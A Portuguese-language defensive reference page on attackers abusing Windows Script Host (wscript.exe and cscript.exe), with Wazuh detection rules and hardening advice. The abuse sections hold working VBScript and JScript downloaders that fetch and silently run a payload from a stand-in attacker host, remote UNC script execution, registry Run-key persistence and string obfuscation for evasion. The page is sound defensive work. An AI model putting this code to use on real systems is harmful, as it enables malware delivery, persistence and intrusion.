# wscript.exe / cscript.exe

**Plataforma:** Windows (todas as versões)

**Categorias:** Execução de código, Download, AWL Bypass, Persistência

**MITRE ATT&CK:** T1059.005 (Visual Basic), T1059.007 (JavaScript), T1105 (Ingress Tool Transfer)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Wscript/ e https://lolbas-project.github.io/lolbas/Binaries/Cscript/

---

## O que são wscript.exe e cscript.exe

O Windows Script Host (WSH) é um ambiente de execução de scripts integrado ao Windows desde o Windows 98. Oferece dois executáveis: `wscript.exe` (Windows Script Host — executa scripts com interface gráfica, podendo exibir caixas de diálogo) e `cscript.exe` (Console Script Host — executa scripts no console, com saída em texto).

Ambos executam VBScript (`.vbs`), JScript (`.js`) e outros formatos de script via engines instaladas. O VBScript e o JScript têm acesso completo ao sistema via objetos ActiveX como `WScript.Shell`, `Scripting.FileSystemObject` e `MSXML2.XMLHTTP` — essencialmente acesso total ao sistema operacional.

---

## Por que atacantes usam o wscript.exe e cscript.exe

O WSH é o vetor clássico de phishing por e-mail. Arquivos `.vbs` e `.js` anexados em e-mails, quando abertos por usuários, executam código com os privilégios do usuário corrente e têm acesso irrestrito ao sistema — exatamente como um executável `.exe`, mas com a aparência de um arquivo de script.

O wscript é também usado como proxy de execução: em vez de executar um `.exe` que seria bloqueado por AppLocker, o atacante empacota o payload em um script VBS ou JS que o carrega dinamicamente.

---

## Técnicas de abuso

### Execução de script VBScript malicioso

Um arquivo `.vbs` básico que executa um comando:

```vbscript
' payload.vbs
Set oShell = CreateObject("WScript.Shell")
oShell.Run "cmd.exe /c whoami > C:\temp\out.txt", 0, True
```

```cmd
:: Executar via wscript (com possível janela/diálogo)
wscript.exe payload.vbs

:: Executar via cscript (saída no console)
cscript.exe payload.vbs

:: Silencioso (sem janelas)
wscript.exe //B payload.vbs
```

### Download e execução via VBScript

Este é um dos padrões mais comuns em phishing — o arquivo VBS baixa e executa um payload:

```vbscript
' downloader.vbs
Dim http, stream
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://attacker.com/payload.exe", False
http.Send

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.responseBody
stream.SaveToFile "C:\Users\Public\update.exe", 2
stream.Close

CreateObject("WScript.Shell").Run "C:\Users\Public\update.exe", 0, False
```

### Download e execução via JScript

```javascript
// payload.js
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.Open("GET", "http://attacker.com/payload.exe", false);
http.Send();

var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(http.responseBody);
stream.SaveToFile("C:\\Users\\Public\\update.exe", 2);
stream.Close();

new ActiveXObject("WScript.Shell").Run("C:\\Users\\Public\\update.exe", 0, false);
```

```cmd
wscript.exe payload.js
cscript.exe //NoLogo payload.js
```

### Shell reverso via VBScript

```vbscript
' reverse_shell.vbs
Dim oShell, oExec
Set oShell = CreateObject("WScript.Shell")

' Simples — executa PowerShell com payload de shell reverso
oShell.Run "powershell.exe -enc <base64_payload>", 0, False
```

### Execução de script remoto via URL

O wscript pode, em algumas configurações, executar scripts de caminhos UNC:

```cmd
:: Executar script diretamente de compartilhamento
wscript.exe \\attacker.com\share\payload.vbs

:: Via WebDAV
wscript.exe \\attacker.com@80\DavWWWRoot\payload.vbs
```

### Persistência via registro (Run key)

```vbscript
' persist.vbs
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", _
  "wscript.exe //B C:\Users\Public\beacon.vbs", "REG_SZ"
```

### Bypass de AppLocker via WSH

Em configurações padrão do AppLocker que permitem scripts em `Program Files` e `Windows`, scripts em diretórios do usuário podem ser bloqueados. No entanto, algumas configurações deixam o wscript/cscript desbloqueados para todos os scripts, contornando restrições de `.exe`.

---

## Técnicas de bypass e evasão

### Ofuscação de VBScript

```vbscript
' Construção de string por partes para evitar detecção de palavras-chave
Dim cmd
cmd = "cmd" & ".exe /c " & "who" & "ami"
CreateObject("WScript." & "Shell").Run cmd, 0, True

' Via Chr() para ofuscar strings
Dim s
s = Chr(99) & Chr(109) & Chr(100)  ' "cmd"
CreateObject("WScript.Shell").Run s & ".exe /c whoami", 0, True
```

### Uso de extensões alternativas

```cmd
:: O wscript executa qualquer script com engine registrada
wscript.exe payload.vbe    ' VBScript encoded
cscript.exe payload.wsf    ' Windows Script File (pode incluir múltiplos engines)
```

### Execução via COM sem chamar wscript.exe diretamente

```powershell
# Instanciar WSH via COM — não cria processo wscript.exe visível
$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("cmd.exe /c whoami", 0, $true)
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- wscript ou cscript executando scripts de diretórios temporários ou de usuário (`%TEMP%`, `%APPDATA%`, `Downloads`)
- wscript iniciado como filho de processo Office ou cliente de e-mail
- wscript iniciando conexão de rede (Sysmon Event ID 3) — download em VBS/JS
- wscript ou cscript criando processos filhos executáveis (cmd, powershell)
- wscript executando script de UNC path remoto

**Indicadores de média relevância:**

- Scripts `.vbs` ou `.js` criados em diretórios de usuário
- wscript com argumento `//B` (silencioso) em scripts de localização suspeita

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0201-lolbas_execution.xml -->

<!-- wscript/cscript iniciado por Office ou e-mail -->
<rule id="100331" level="15">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)(wscript|cscript)\.exe$</field>
  <field name="win.eventdata.parentImage" type="pcre2">(?i)(WINWORD|EXCEL|OUTLOOK|POWERPNT|THUNDERBIRD)\.EXE$</field>
  <description>wscript/cscript iniciado por aplicativo de e-mail ou Office — possivel phishing com script malicioso</description>
  <mitre>
    <id>T1059.005</id>
    <id>T1566.001</id>
  </mitre>
</rule>

<!-- wscript/cscript executando script de diretório do usuário -->
<rule id="100332" level="12">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)(wscript|cscript)\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Users\\|\\Temp\\|\\AppData\\|\\Downloads\\|\\Desktop\\).*(\.vbs|\.js|\.vbe|\.wsf)</field>
  <description>wscript/cscript executando script de diretorio de usuario — possivel payload de phishing</description>
  <mitre>
    <id>T1059.005</id>
  </mitre>
</rule>

<!-- wscript/cscript iniciando conexão de rede -->
<rule id="100333" level="13">
  <if_group>sysmon_event3</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)(wscript|cscript)\.exe$</field>
  <description>wscript/cscript iniciando conexao de rede — possivel download de payload via script</description>
  <mitre>
    <id>T1105</id>
    <id>T1059.005</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Scripts administrativos legítimos:** muitos ambientes corporativos ainda usam VBScript para tarefas de login, mapeamento de unidades e configuração de estação. Esses scripts geralmente estão em caminhos de rede ou de GPO (`SYSVOL`, `NETLOGON`). Filtre por localização do script e usuário de serviço de GPO.

**Instaladores legados:** alguns instaladores e ferramentas legadas usam VBScript como parte do processo de instalação. Filtre por janela de tempo de instalação e diretório de origem em `Program Files`.

---

## Proteção e controles defensivos

**Desabilitar wscript e cscript via GPO:** para usuários finais, os scripts VBS e JS raramente têm necessidade operacional. Configure a GPO "Turn off Windows Script Host" para desabilitar o WSH completamente:

```
Computer Configuration > Administrative Templates > Windows Components > Windows Script Host > Turn off Windows Script Host = Enabled
```

**Associar extensões .vbs e .js a Notepad:** mesmo sem desabilitar o WSH, alterar a associação de arquivo das extensões `.vbs`, `.js`, `.vbe` e `.wsf` para o Bloco de Notas previne a execução acidental quando o usuário abre um anexo.

**Bloquear extensões em gateway de e-mail:** configure o gateway de e-mail para quarentenar ou bloquear anexos com extensões `.vbs`, `.vbe`, `.js`, `.jse`, `.wsf` e `.wsh`.

---

## Referências

- LOLBAS — wscript.exe: https://lolbas-project.github.io/lolbas/Binaries/Wscript/
- LOLBAS — cscript.exe: https://lolbas-project.github.io/lolbas/Binaries/Cscript/
- MITRE ATT&CK T1059.005: https://attack.mitre.org/techniques/T1059/005/
- MITRE ATT&CK T1059.007: https://attack.mitre.org/techniques/T1059/007/
